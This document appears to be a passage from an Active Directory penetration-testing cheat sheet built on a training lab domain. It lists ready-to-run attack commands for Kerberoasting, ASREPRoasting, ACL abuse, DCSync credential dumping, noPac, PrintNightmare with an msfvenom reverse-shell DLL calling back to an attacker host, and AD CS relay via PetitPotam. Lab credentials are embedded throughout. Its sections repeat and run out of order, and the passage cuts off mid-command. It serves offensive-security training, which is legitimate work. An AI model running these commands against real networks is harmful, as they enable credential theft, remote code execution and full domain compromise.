  * **What it does:** A tool for enumerating SMB shares and their permissions. This command lists all shares on the host and tells you what level of access your current user (`forend`) has to each (e.g., NO ACCESS, READ ONLY, READ/WRITE).
  * **When to use it:** To get a quick, clean overview of accessible network shares on a target. It's great for identifying promising places to look for sensitive files.
  * **Example Command:**
    ```shell
    smbmap -u forend -p 'Klmcargo2' -d INLANEFREIGHT.LOCAL -H 172.16.5.5
    ```
  * **Options:**
      * `-d INLANEFREIGHT.LOCAL`: Specifies the **d**omain.
      * `-H 172.16.5.5`: The target **H**ost.

#### `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`

  * **What it does:** A script from the Impacket suite that provides a semi-interactive shell on a remote Windows host using WMI.
  * **When to use it:** For lateral movement. If you've discovered that your user (`wley`) is a local administrator on a target machine (`172.16.5.5`), you can use `wmiexec.py` to get a shell and execute commands on it. It's often stealthier than `psexec.py`.
  * **Example Command:**
    ```shell
    wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
    ```

#### `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`

  * **What it does:** The Python-based data collector for BloodHound. It connects to the domain, performs a massive amount of enumeration (users, computers, groups, sessions, ACLs, GPOs, trusts), and saves all the collected data into a set of JSON files.
  * **When to use it:** This is a **critical** step. After gaining your first set of credentials, run this tool. You then import the resulting JSON files into the BloodHound GUI to visually map out attack paths to Domain Admin.
  * **Example Command:**
    ```shell
    sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
    ```
  * **Options:**
      * `-ns 172.16.5.5`: The **n**ame **s**erver (or DC) to query.
      * `-d inlanefreight.local`: The target **d**omain.
      * `-c all`: The **c**ollection method. `all` is the most comprehensive.

-----

### From Windows

Here are the commands you would run if your shell is on a domain-joined Windows machine.

#### `Import-Module ActiveDirectory`

  * **What it does:** Loads the official Microsoft PowerShell module for Active Directory management.
  * **When to use it:** If your compromised machine is a Domain Controller or a workstation with RSAT (Remote Server Administration Tools) installed, this module provides a powerful, built-in set of tools for AD enumeration.
  * **Example Command:**
    ```powershell
    Import-Module ActiveDirectory
    ```

#### `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`

  * **What it does:** A command from the `ActiveDirectory` module. It queries the domain for all user accounts that have a Service Principal Name (SPN) configured.
  * **When to use it:** To identify user accounts that are running services (like SQL, web servers). These accounts are the targets for a Kerberoasting attack.
  * **Example Command:**
    ```powershell
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select Name, ServicePrincipalName
    ```

#### `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`

  * **What it does:** A PowerView command that lists all members of the "Domain Admins" group.
  * **When to use it:** To identify your primary targets. Knowing who the Domain Admins are is essential. The `-Recurse` flag is important because it will also show members of groups that are nested inside the Domain Admins group.
  * **Example Command:**
    ```powershell
    Get-DomainGroupMember -Identity "Domain Admins" -Recurse
    ```

#### `Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v`

  * **What it does:** Snaffler is a tool for finding sensitive data ("loot") on network file shares. It automatically enumerates computers, scans their shares, and looks for files with interesting names or content (e.g., credentials, configuration files, backups).
  * **When to use it:** After gaining an initial foothold, run Snaffler to automate the hunt for valuable information across the entire domain. It can quickly find forgotten credentials and sensitive documents.
  * **Example Command:**
    ```shell
    Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v
    ```
  * **Options:**
      * `-s`: Search file **s**hares.
      * `-d inlanefreight.local`: The target **d**omain.
      * `-o snaffler.log`: **o**utput the findings to a log file.
      * `-v`: **v**erbose mode.

#### `.\SharpHound.exe -c All --zipfilename ILFREIGHT.zip`

  * **What it does:** The C\# version of the BloodHound collector. It's the official, recommended ingestor to run from a Windows machine. It collects the same data as the Python version but is generally faster and more reliable within a Windows environment.
  * **When to use it:** When you have a shell on a Windows host and want to collect data for BloodHound.
  * **Example Command:**
    ```shell
    .\SharpHound.exe -c All --zipfilename ILFREIGHT.zip
    ```
  * **Options:**
      * `-c All`: Use the `All` **c**ollection method.
      * `--zipfilename ILFREIGHT.zip`: Automatically compresses the output JSON files into a single zip file, making it much easier to download from the target machine.
-----

## Kerberoasting

Kerberoasting is an attack that targets Active Directory user accounts running a service (like MSSQL, HTTP, etc.). These accounts have a **Service Principal Name (SPN)** associated with them. Any authenticated domain user can request a Kerberos service ticket (TGS) for any service. Part of this ticket is encrypted with the service account's NTLM password hash. We can take this ticket offline and try to crack the hash to reveal the service's plaintext password. ☕

### From Linux

#### `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs.hash`

  * **What it does:** This is the primary tool for Kerberoasting from the Impacket suite. It performs two actions: first, it asks the Domain Controller for a list of all accounts with SPNs, and second, it requests a crackable service ticket for a specific user (`sqldev`).
  * **When to use it:** Once you have any set of valid, low-privileged domain credentials (`INLANEFREIGHT.LOCAL/forend` in this case). Use it to find service accounts and extract their password hashes for offline cracking.
  * **Example Command:**
    ```shell
    GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs.hash
    ```
  * **Options:**
      * `-dc-ip 172.16.5.5`: The IP of the **D**omain **C**ontroller.
      * `INLANEFREIGHT.LOCAL/forend`: The user account you are using to perform the enumeration. You'll be prompted for this user's password.
      * `-request-user sqldev`: **Request** a ticket for the specific target **user** `sqldev`.
      * `-outputfile sqldev_tgs.hash`: Saves the extracted hash to a file in a format ready for cracking.

#### `hashcat -m 13100 sqldev_tgs.hash /usr/share/wordlists/rockyou.txt`

  * **What it does:** Uses Hashcat to crack the Kerberos TGS ticket hash that you extracted with `GetUserSPNs.py`.
  * **When to use it:** This is the step immediately after obtaining the hash. The goal is to find the service account's plaintext password.
  * **Example Command:**
    ```shell
    hashcat -m 13100 sqldev_tgs.hash /usr/share/wordlists/rockyou.txt
    ```
  * **Options:**
      * `-m 13100`: The Hashcat hash **m**ode for "Kerberos 5, TGS-REP, etype 23". This is the standard hash type for Kerberoasting.
      * `sqldev_tgs.hash`: The file containing the hash to crack.
      * `/usr/share/wordlists/rockyou.txt`: The wordlist of passwords to try.

-----

### From Windows

#### `setspn.exe -Q */*`

  * **What it does:** A built-in Windows command-line utility for managing SPNs. This command **Q**ueries the domain for all (`*/*`) registered SPNs.
  * **When to use it:** As a native "living off the land" way to identify potential Kerberoasting targets without needing any external tools. It lists the accounts that have SPNs set.
  * **Example Command:**
    ```shell
    setspn.exe -T INLANEFREIGHT.LOCAL -Q */*
    ```
  * **Options:**
      * `-T INLANEFREIGHT.LOCAL`: **T**argets the specified domain.
      * `-Q */*`: **Q**ueries for all SPNs.

#### `Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat > kerberoast_hashes.txt`

  * **What it does:** This is a PowerView one-liner that automates the entire Kerberoasting process. `Get-DomainUser -SPN` finds all kerberoastable users, and pipes the results to `Get-DomainSPNTicket`, which requests the tickets and extracts the hashes in a format ready for Hashcat.
  * **When to use it:** This is one of the most efficient ways to perform the attack when you have a PowerShell session on a domain-joined Windows host.
  * **Example Command:**
    ```powershell
    # First, import PowerView
    Import-Module .\PowerView.ps1
    # Then run the attack
    Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat > kerberoast_hashes.txt
    ```
  * **Options:**
      * `-SPN`: A filter for `Get-DomainUser` to find only accounts with SPNs.
      * `-Format Hashcat`: Specifies the output format for the hashes.

#### `.\Rubeus.exe kerberoast /nowrap`

  * **What it does:** Rubeus is a C\# tool dedicated to Kerberos abuse. The `kerberoast` command automates the entire process: it finds all kerberoastable users, requests a TGS ticket for each one, and prints the crackable hash to the console.
  * **When to use it:** Rubeus is the state-of-the-art tool for this attack on Windows. It's extremely fast, powerful, and offers many advanced options for filtering and formatting.
  * **Example Command:**
    ```shell
    .\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
    ```
  * **Options:**
      * `/nowrap`: Prevents the long hash string from being word-wrapped in the console, making it easier to copy.
      * `/outfile:hashes.txt`: Saves the hashes to a file.
      * `/format:hashcat`: Outputs the hashes in Hashcat format.
      * `/ldapfilter:'(admincount=1)'`: An advanced filter to only roast users who are (or were) members of privileged groups.

-----

## Access Control (ACL) Abuse

Every object in Active Directory—users, groups, computers—has an **Access Control List (ACL)** attached to it. This ACL is made up of **Access Control Entries (ACEs)**, which are individual permissions that define who can do what to that object. For example, an ACE might grant the 'Help Desk' group the right to reset the password of a user object.

When these permissions are misconfigured (e.g., a standard user is granted the right to modify a Domain Admins group), it creates a direct path to privilege escalation. This section details how to find and exploit these misconfigurations. ⛓️

### Finding Abusable ACLs

Before you can exploit an ACL, you have to find it. These PowerView commands are your primary tools for discovery.

#### `Find-InterestingDomainAcl`

  * **What it does:** This is PowerView's "easy button" for ACL hunting. It automatically scans the domain for a pre-defined list of common, high-impact misconfigurations, such as a user having rights to add members to a privileged group or reset a privileged user's password.
  * **When to use it:** Run this early in your credentialed enumeration phase. It quickly highlights the most obvious and direct paths to privilege escalation, saving you hours of manual analysis.
  * **Example Command:**
    ```powershell
    Find-InterestingDomainAcl -ResolveGUIDs | ft
    ```
  * **Options:**
      * `-ResolveGUIDs`: Translates the cryptic internal GUIDs for permissions into human-readable names like `ForceChangePassword` or `GenericWrite`. This is essential for understanding the output.
      * `| ft`: Formats the output as a table for easier reading.

#### `Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs`

  * **What it does:** This command acts as a precision tool, allowing you to retrieve and inspect the full ACL for a specific object. In this example, it's dumping all the permissions on the "Domain Admins" group object itself.
  * **When to use it:** When you've identified a high-value target (like a specific user, computer, or group) and you want to perform a deep-dive analysis to see exactly who has what permissions on it.
  * **Example Command:**
    ```powershell
    Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ? { $_.ActiveDirectoryRights -notlike "*Read*" }
    ```
  * **Options:**
      * `-Identity 'Domain Admins'`: Specifies the object you want to investigate.
      * `? { $_.ActiveDirectoryRights -notlike "*Read*" }`: A PowerShell filter to remove common, low-impact "Read" permissions from the output, helping you focus on the dangerous "Write" or "All" permissions.

-----

### Mapping Privileges to Exploits

Here is a detailed breakdown of the most commonly abused permissions and the exact commands used to exploit them.

#### Privilege: `GenericAll`

  * **What it means:** The holder has **full control** over the target object. This is the highest level of privilege.
  * **How to Exploit:** You can do anything you want. The most common abuse is to add yourself or a user you control to the target group if it's a group object.
  * **Example Exploit (adding user 'forend' to the 'Domain Admins' group):**
    ```powershell
    Add-DomainGroupMember -Identity 'Domain Admins' -Members 'forend'
    ```

#### Privilege: `WriteDacl`

  * **What it means:** The holder can **write to the Discretionary Access Control List (DACL)**. This means they can modify the permissions of the object.
  * **How to Exploit:** This is the "god mode" of ACL rights. If you have `WriteDacl` on an object, you can give yourself any other permission you want, such as `GenericAll` or the specific rights needed for a DCSync attack.
  * **Example Exploit (granting your user 'forend' DCSync rights on the domain):**
    ```powershell
    $User = 'INLANEFREIGHT\forend'
    # The two GUIDs for DCSync rights
    $DCSyncGUIDs = @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')
    # Get the domain's root object
    $Domain = Get-ADDomain
    # Add an ACE for each DCSync right
    $DCSyncGUIDs | %{ Add-DomainObjectAcl -TargetIdentity $Domain.DistinguishedName -PrincipalIdentity $User -Rights All -ObjectType $_ -Verbose }
    ```

#### Privilege: `WriteOwner`

  * **What it means:** The holder can change the owner of the object to themselves.
  * **How to Exploit:** Once you are the owner of an object, you implicitly have `WriteDacl` permissions. So, the attack is a two-step process: take ownership, then use your new `WriteDacl` privilege to grant yourself `GenericAll`.
  * **Example Exploit:**
    ```powershell
    # Step 1: Take ownership
    Set-DomainObjectOwner -Identity 'Target Group' -Owner 'forend'
    # Step 2: Grant yourself GenericAll (now that you're the owner)
    Add-DomainObjectAcl -TargetIdentity 'Target Group' -PrincipalIdentity 'forend' -Rights All
    ```

#### Privilege: `WriteProperty` (on the `member` attribute) / `WriteMembers`

  * **What it means:** The holder can add or remove members from a group.
  * **How to Exploit:** This is the most straightforward group-based privilege escalation. You simply add a user you control to the privileged group.
  * **Example Exploit (adding user 'forend' to the 'Backup Operators' group):**
    ```powershell
    Add-DomainGroupMember -Identity 'Backup Operators' -Members 'forend'
    ```

#### Privilege: `GenericWrite`

  * **What it means:** The holder can write to any "unprotected" property of an object. This is a very versatile permission that can be abused in several ways.
  * **How to Exploit (Method 1 - Kerberoasting):** Write to the `servicePrincipalName` property to make a user kerberoastable.
    ```powershell
    # Set an SPN on a victim user to make them kerberoastable
    Set-DomainObject -Identity 'victim_user' -Set @{serviceprincipalname='notahacker/legit.service'}
    # Now kerberoast the user with Rubeus
    .\Rubeus.exe kerberoast /user:victim_user
    ```
  * **How to Exploit (Method 2 - Resource-Based Constrained Delegation):** Write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` property to configure RBCD, allowing you to impersonate users on that machine.
    ```powershell
    # Attacker controls 'ATTACKER-PC$'
    # We have GenericWrite on 'VICTIM-SERVER'
    Set-DomainObject -Identity 'VICTIM-SERVER' -Set @{'msds-allowedtoactonbehalfofotheridentity'=([System.Security.Principal.SecurityIdentifier]'S-1-5-21...-1105').Translate([System.Security.Principal.NTAccount])}
    ```

#### Privilege: `ForceChangePassword`

  * **What it means:** The holder can reset a user's password without needing to know the current password.
  * **How to Exploit:** Simply set a new password for the target user and then log in as them.
  * **Example Exploit (resetting the password for user 'damundsen'):**
    ```powershell
    Set-DomainUserPassword -Identity 'damundsen' -AccountPassword 'Pwn3d!Summer2025' -Verbose
    ```

-----

## DCSync

DCSync is an attack that abuses a specific set of permissions in Active Directory, namely `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`. A user with these rights can impersonate a Domain Controller (DC) and ask another DC to replicate user credential data. This includes the NTLM hashes of **all users**, including the `krbtgt` account—the golden ticket master key. Gaining these rights is often a "win" condition for an attacker. 👑

### Finding Users with DCSync Rights

Before you can perform the attack, you must identify a user who has been granted these permissions.

#### `Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -match 'Replication-Get'}`

  * **What it does:** This PowerView command queries the Access Control List (ACL) of the domain object itself. It then filters this list to find only the Access Control Entries (ACEs) that grant the specific "Replication-Get-Changes" permissions required for a DCSync attack.
  * **When to use it:** During credentialed enumeration to proactively hunt for users or groups that have been granted these powerful rights. Compromising any principal found in this output becomes your top priority.
  * **Example Command:**
    ```powershell
    # First, find the SID of the user you want to check, e.g., 'adunn'
    $sid = (Get-DomainUser adunn).ObjectSid.Value

    # Now, check for DCSync rights on the domain for that specific SID
    Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ? {$_.SecurityIdentifier -match $sid}
    ```
  * **Options:**
      * `-ResolveGUIDs`: Translates internal GUIDs into human-readable permission names.
      * `? { ... }`: This is a PowerShell `Where-Object` clause used to filter the ACLs. The first part looks for the specific `Replication-Get` permissions, and the second (optional) part can check if a specific user (`$sid`) has those rights.

-----

### Executing the DCSync Attack

Once you have compromised a user with DCSync privileges, you can use the following tools to dump all domain credentials.

#### `secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5`

  * **What it does:** A flagship script from the Impacket suite that performs the DCSync attack from a Linux machine. It uses the provided credentials (`adunn`) to connect to the Domain Controller and remotely dump the entire NTDS.dit database, containing the password hashes for all users in the domain.
  * **When to use it:** This is the primary tool for executing the DCSync attack from your attacker machine once you have compromised a user with the necessary privileges.
  * **Example Command:**
    ```shell
    secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn:'Pwn3d_by_ACLs!'@172.16.5.5
    ```
  * **Options:**
      * `-outputfile inlanefreight_hashes`: Saves the dumped hashes into a set of files for later use (e.g., pass-the-hash attacks).
      * `-just-dc`: This crucial flag tells `secretsdump` to perform the attack via the DCSync replication method.
      * `INLANEFREIGHT/adunn:'...'@172.16.5.5`: The format for providing the domain, username, password, and the target Domain Controller's IP.

#### `.\mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt"`

  * **What it does:** Uses the legendary Mimikatz tool to perform the DCSync attack from a Windows host. This specific command targets the most valuable account: `krbtgt`. The hash of the `krbtgt` account is required to forge Golden Tickets, giving you persistent, god-like access to the domain.
  * **When to use it:** When you have a shell on a Windows machine as a user with DCSync rights. This is the definitive tool for this attack on Windows.
  * **Example Command & Interaction:**
    ```shell
    # You may need to enable debug privileges first
    mimikatz # privilege::debug
    # Execute the DCSync attack for the krbtgt account
    mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt
    ```
  * **Options:**
      * `lsadump::dcsync`: The Mimikatz module for this attack.
      * `/domain:INLANEFREIGHT.LOCAL`: The target domain.
      * `/user:krbtgt`: The specific user to get the password hash for. You can change this to any user (e.g., `administrator`) or omit it to try and dump all users.

Let's proceed. After enumerating the network and potentially elevating your privileges, the next step is to use that access to move around the network and exploit services.

-----

-----

## Privileged Access

This phase is about **lateral movement**. You've identified that a user you control has administrative rights on other machines, or is a sysadmin on a database server. Now, you will use those privileges to gain shells, access sensitive data, and further your foothold in the network. 🏃‍♂️

### Gaining Remote Shells

The most common way to move laterally is by using your credentials to get a remote command shell on another machine.

#### `Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred`

  * **What it does:** This PowerShell cmdlet establishes a fully interactive remote session using PowerShell Remoting (WinRM). It's the native, most powerful way to remotely manage a Windows machine.
  * **When to use it:** When you're on a Windows machine and have credentials for a user who is a member of the "Remote Management Users" or the local "Administrators" group on the target server.
  * **Example Command (Full Workflow):**
    ```powershell
    # First, create a secure credential object for the user 'forend'
    $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

    # Now, use that credential object to start a remote session
    Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
    ```

#### `evil-winrm -i 10.129.201.234 -u forend -p 'Klmcargo2'`

  * **What it does:** A popular Ruby-based tool that gives you a PowerShell Remoting (WinRM) shell from a **Linux** attacker machine. It's the go-to alternative to `Enter-PSSession` for non-Windows users.
  * **When to use it:** This is your primary tool for WinRM-based lateral movement from Kali or another Linux attack box.
  * **Example Command:**
    ```shell
    evil-winrm -i 10.129.201.234 -u forend -p 'Klmcargo2'
    ```
  * **Options:**
      * `-i 10.129.201.234`: The target **I**P address.
      * `-u forend`: The **u**sername.
      * `-p 'Klmcargo2'`: The **p**assword.

-----

### Exploiting MSSQL Servers

Database servers are often treasure troves of sensitive data and can be a powerful pivot point if configured insecurely.

#### `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`

  * **What it does:** A script from the Impacket suite that connects to a Microsoft SQL Server instance using Windows Authentication and provides you with an interactive SQL shell.
  * **When to use it:** When you've identified an MSSQL server (port 1433) and have credentials for a user who has login rights to it.
  * **Example Command:**
    ```shell
    # You will be prompted for DAMUNDSEN's password
    mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
    ```
  * **Options:**
      * `-windows-auth`: Tells the client to use Windows Integrated Authentication instead of SQL-specific logins.

#### `enable_xp_cmdshell` and `xp_cmdshell whoami /priv`

  * **What it does:** These commands are run *inside* the `mssqlclient.py` shell.
      * `enable_xp_cmdshell`: Reconfigures the database to enable the `xp_cmdshell` stored procedure. This is often disabled by default for security reasons.
      * `xp_cmdshell whoami /priv`: Executes a Windows shell command (`whoami /priv`) through the `xp_cmdshell` procedure.
  * **When to use it:** If the user you've logged in as is a sysadmin (`sa`) on the SQL server, you can enable `xp_cmdshell` to get command execution on the underlying operating system. This is a classic way to escalate from database admin to a shell on the server, often running as a highly privileged service account like `NT AUTHORITY\SYSTEM`.
  * **Example Interaction:**
    ```sql
    SQL> enable_xp_cmdshell
    SQL> xp_cmdshell whoami /priv
    ```

-----

### Finding Attack Paths with BloodHound

BloodHound excels at finding complex paths to privileged access that would be difficult to spot manually.

#### `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2`

  * **What it does:** This is a Cypher query for the BloodHound GUI. It searches for the shortest path where a user, through one or more nested groups, gains `CanPSRemote` (WinRM) access to a computer.
  * **When to use it:** To find clear lateral movement opportunities. Instead of manually checking if your user is in a group that's in another group that has admin rights, this query does it for you automatically.
  * **Example in practice:** Copy and paste this query into the search bar in the BloodHound GUI after you've imported your data.

-----

## Bleeding Edge

These are the high-impact exploits. They often target specific unpatched vulnerabilities or misconfigurations in advanced AD components like Certificate Services. A successful attack in this category can often take you from a low-privileged user to Domain Admin in a single chain. 🔪

### noPac / SAM the Admin (CVE-2021-42287 & CVE-2021-42278)

This attack chain abuses two vulnerabilities to escalate from any standard user to Domain Admin. It involves creating a machine account, renaming it to match a Domain Controller's name (minus the final `$`), and then requesting a Kerberos ticket.

#### `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:'Klmcargo2' -dc-ip 172.16.5.5 -shell`

  * **What it does:** This script automates the entire noPac exploit chain. It uses the provided user credentials (`forend`) to authenticate, exploits the vulnerabilities to get a ticket as a Domain Admin, and then uses that ticket to launch a semi-interactive shell running as `SYSTEM` on the Domain Controller.
  * **When to use it:** When you have standard user credentials and have confirmed (using the `scanner.py` script) that the Domain Controllers are not patched against these specific vulnerabilities.
  * **Example Command:**
    ```shell
    sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:'Klmcargo2' -dc-ip 172.16.5.5 --impersonate administrator -shell
    ```
  * **Options:**
      * `--impersonate administrator`: Specifies the user to impersonate. `administrator` is a common choice.
      * `-shell`: After successfully exploiting, provides an interactive shell on the DC.
      * `-dump`: Can be used instead of `-shell` to perform a DCSync and dump all domain hashes.

-----

### PrintNightmare (CVE-2021-1675)

This vulnerability in the Windows Print Spooler service allows any authenticated user to remotely execute code as `SYSTEM` on a vulnerable machine, including a Domain Controller.

#### `sudo python3 CVE-2021-1675.py inlanefreight.local/forend:'Klmcargo2'@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'`

  * **What it does:** This is the exploit script. It authenticates to the target DC (`172.16.5.5`) and instructs its Print Spooler service to load and execute a malicious DLL from an SMB share that you control (`\\172.16.5.225\CompData\backupscript.dll`).
  * **When to use it:** When a target (especially a DC) has the Print Spooler service enabled and is not patched for this vulnerability. This is a direct path to remote code execution.
  * **Example Exploit Chain:**
    1.  **Create a malicious DLL:**
        ```shell
        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
        ```
    2.  **Host the DLL on an SMB share:**
        ```shell
        sudo smbserver.py -smb2support CompData ./
        ```
    3.  **Run the exploit:**
        ```shell
        sudo python3 CVE-2021-1675.py inlanefreight.local/forend:'Klmcargo2'@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
        ```

-----

### AD CS Relay (ESC8)

This is a powerful attack that relays NTLM authentication to an Active Directory Certificate Services (AD CS) web endpoint to enroll for a certificate on behalf of the victim. If the victim is a DC, you get a certificate that can be used to get a TGT and compromise the domain.

#### `sudo ntlmrelayx.py --target http://ACADEMY-EA-CA01/certsrv/certfnsh.asp --adcs --template DomainController`

  * **What it does:** This command sets up the relay server. `ntlmrelayx` will listen for incoming NTLM authentications. When it gets one, it will forward (relay) it to the AD CS web server specified in the `--target` and request a certificate using the `DomainController` template.
  * **When to use it:** When you've identified an AD CS server with a vulnerable web enrollment endpoint (HTTP, not HTTPS) and misconfigured certificate templates.
  * **Example Exploit Chain:**
    1.  **Start the relay server:**
        ```shell
        sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
        ```
    2.  **Coerce an authentication from the DC to your relay server:**
        ```shell
        python3 PetitPotam.py 172.16.5.225 172.16.5.5
        ```
    3.  `ntlmrelayx` will catch the authentication and use it to get a base64-encoded certificate for the DC.
    4.  **Use the certificate to get a TGT:**
        ```shell
        python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE64_CERT_FROM_NTLMRELAYX> dc01.ccache
        ```
    5.  **With the TGT cached, perform DCSync:**
        ```shell
        export KRB5CCNAME=dc01.ccache
        secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ```

-----

## Phase 1: Gaining Initial Access

This phase focuses on turning zero access into a foothold. The goal is to obtain at least one valid set of domain credentials through network-level attacks, user enumeration, and exploiting weak configurations. 🔑

### ASRepRoasting

This attack targets user accounts that have **Kerberos pre-authentication disabled**. This insecure setting allows an attacker to request a piece of Kerberos data for that user, which is encrypted with the user's NTLM password hash. This data can be taken offline and cracked without ever sending a bad password to the Domain Controller, thus avoiding lockouts.

* **Step 1: Find Vulnerable Users**
    * **What it does:** Uses PowerView (from Windows) or `kerbrute` (from Linux) to identify accounts with the "Do not require Kerberos preauthentication" flag set.
    * **When to use it:** During unauthenticated or authenticated enumeration to find easy targets for offline password cracking.
    * **Example Commands:**
        ```powershell
        # From Windows, using PowerView
        Get-DomainUser -PreauthNotRequired | select samaccountname
        ```
        ```shell
        # From Linux, enumerating and validating a user list
        kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/userlist.txt
        ```

* **Step 2: Request the Hash**
    * **What it does:** Uses `Rubeus` (Windows) or Impacket's `GetNPUsers.py` (Linux) to request the crackable Kerberos ticket (the AS-REP response) for a vulnerable user.
    * **When to use it:** After identifying a target from Step 1. This step requires no password.
    * **Example Commands:**
        ```shell
        # From Windows
        .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
        ```
        ```shell
        # From Linux
        GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
        ```

* **Step 3: Crack the Hash**
    * **What it does:** Uses Hashcat to perform an offline brute-force or dictionary attack against the captured AS-REP hash.
    * **When to use it:** Once you have the hash. The goal is to recover the user's cleartext password.
    * **Example Command:**
        ```shell
        # The mode '18200' is for Kerberos 5, etype 23, AS-REP
        hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
        ```

-----

## Phase 2: Authenticated Enumeration & Situational Awareness

You have credentials. Now the real work begins. This phase is about using your newfound access to map the internal Active Directory environment, identify privileged users, find misconfigurations, and plot a path to privilege escalation. This is where **BloodHound** shines. 🗺️

### Comprehensive Data Collection for BloodHound

* **What it does:** BloodHound collectors (`SharpHound` for Windows, `bloodhound-python` for Linux) systematically query Active Directory for users, groups, computers, sessions, ACLs, GPOs, and trusts. The output is a set of JSON files that can be imported into the BloodHound GUI to visualize attack paths.
* **When to use it:** This should be one of the **first actions** you take after gaining any valid domain credentials.
* **Example Commands:**
    ```shell
    # From a Windows host
    .\SharpHound.exe -c All --zipfilename ILFREIGHT.zip
    ```
    ```shell
    # From a Linux host
    bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
    zip -r ilfreight_bh.zip *.json
    ```

### Enumerating Common Misconfigurations

* **What it does:** These commands hunt for common administrative oversights that can provide quick wins.
    * `Get-SpoolStatus`: Checks if the Print Spooler service is running, which is a prerequisite for the PrintNightmare exploit.
    * `Get-DomainUser -UACFilter`: Finds users with dangerous UAC flags, such as `PASSWD_NOTREQD` (password not required).
    * `adidnsdump`: Dumps all DNS records from AD, which can reveal hosts missed by network scans.
    * `Get-DomainUser -Description`: Searches user object descriptions for sensitive information like passwords.
* **When to use it:** During the initial credentialed enumeration phase to find low-hanging fruit.
* **Example Commands:**
    ```powershell
    # From Windows, using various PowerShell modules
    Import-Module .\SecurityAssessment.ps1; Get-SpoolStatus -ComputerName ACADEMY-EA-DC01
    Import-Module .\PowerView.ps1; Get-DomainUser -UACFilter PASSWD_NOTREQD
    Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
    ```
    ```shell
    # From Linux
    adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
    ```

### Finding Credentials in Group Policy (GPP)

* **What it does:** A legacy feature allowed admins to set local user passwords via Group Policy Preferences (GPP). These passwords were AES-encrypted with a publicly known key. These commands search for and decrypt those passwords.
* **When to use it:** When enumerating the `SYSVOL` share, which is readable by all authenticated users.
* **Example Workflow:**
    ```shell
    # Manually browse SYSVOL for policy files
    ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    # Find the cpassword in an XML file and decrypt it
    gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

    # Automate the search across the domain with CrackMapExec
    crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
    ```

-----

## Phase 3: Privilege Escalation & Lateral Movement

With a map of the environment, it's time to move. This phase involves exploiting misconfigurations, abusing Kerberos, and leveraging user privileges to gain higher levels of access and move from machine to machine. 🧗

### Kerberoasting

This is a classic attack that targets **user accounts running services** (e.g., MSSQL, web servers). These accounts have a Service Principal Name (SPN) set. Any authenticated user can request a Kerberos service ticket (TGS) for any service. Part of this ticket is encrypted with the service account's NTLM hash. An attacker can capture this ticket and crack it offline to reveal the service's password.

* **Step 1: Find Kerberoastable Users (Accounts with SPNs)**
    ```powershell
    # From Windows, using PowerView
